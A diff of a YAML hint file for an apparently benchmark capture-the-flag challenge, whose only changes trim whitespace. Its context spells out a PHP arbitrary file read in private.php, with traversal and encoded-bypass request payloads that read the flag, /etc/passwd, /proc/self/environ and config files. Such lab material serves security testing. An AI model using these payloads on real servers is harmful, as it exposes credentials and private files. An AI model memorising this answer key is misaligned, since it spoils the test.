@@ -15,7 +15,7 @@ tricks:
     payload: |
       # private.php line 26:
       # $file = isset($_GET['file']) ? $_GET['file'] : null;
-      # 
+      #
       # private.php line 47-54:
       # if ($file) {
       #     if (file_exists($file) && is_readable($file)) {
@@ -24,7 +24,7 @@ tricks:
       #         echo "<pre>$content</pre>";
       #     }
       # }
-      # 
+      #
       # Vulnerability:
       # - file parameter from $_GET directly used
       # - No path traversal protection
@@ -39,7 +39,7 @@ tricks:
       # Method 1: List directory contents
       GET /private.php?action=list
       # Shows all files in current directory, including xbow-flag.txt
-      # 
+      #
       # Method 2: Try common flag file names
       # xbow-flag.txt (in same directory)
       # flag.txt
@@ -52,14 +52,14 @@ tricks:
     payload: |
       # Direct file read (if in same directory):
       GET /private.php?file=xbow-flag.txt
-      # 
+      #
       # Path traversal (if needed):
       GET /private.php?file=../xbow-flag.txt
       GET /private.php?file=../../xbow-flag.txt
-      # 
+      #
       # Absolute path (if needed):
       GET /private.php?file=/var/www/html/xbow-flag.txt
-      # 
+      #
       # The application:
       # 1. Checks if file exists: file_exists($file)
       # 2. Checks if readable: is_readable($file)
@@ -73,13 +73,13 @@ tricks:
       # Response structure:
       # <h2>Content of xbow-flag.txt</h2>
       # <pre>FLAG{...}</pre>
-      # 
+      #
       # Flag extraction:
       # import re
       # flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
       # if flag_match:
       #     flag = flag_match.group(0)
-      # 
+      #
       # Note: Flag file location: /var/www/html/xbow-flag.txt
       # Created in Dockerfile line 19
 
@@ -91,12 +91,12 @@ tricks:
       /private.php?file=/etc/passwd
       /private.php?file=/etc/hosts
       /private.php?file=/proc/self/environ
-      # 
+      #
       # Read application files:
       /private.php?file=private.php
       /private.php?file=login.php
       /private.php?file=../config.php
-      # 
+      #
       # Note: file_exists() and is_readable() must return true
 
   - name: "Bypass techniques"
@@ -106,14 +106,13 @@ tricks:
       # URL encoding:
       /private.php?file=xbow-flag.txt
       /private.php?file=%78%62%6f%77%2d%66%6c%61%67%2e%74%78%74
-      # 
+      #
       # Double encoding:
       /private.php?file=%25%78%25%62%25%6f%25%77%25%2d%25%66%25%6c%25%61%25%67%25%2e%25%74%25%78%25%74
-      # 
+      #
       # Path traversal:
       /private.php?file=../xbow-flag.txt
       /private.php?file=..%2fxbow-flag.txt
       /private.php?file=....//....//xbow-flag.txt
-      # 
+      #
       # Note: PHP's file_exists() handles path normalization
-
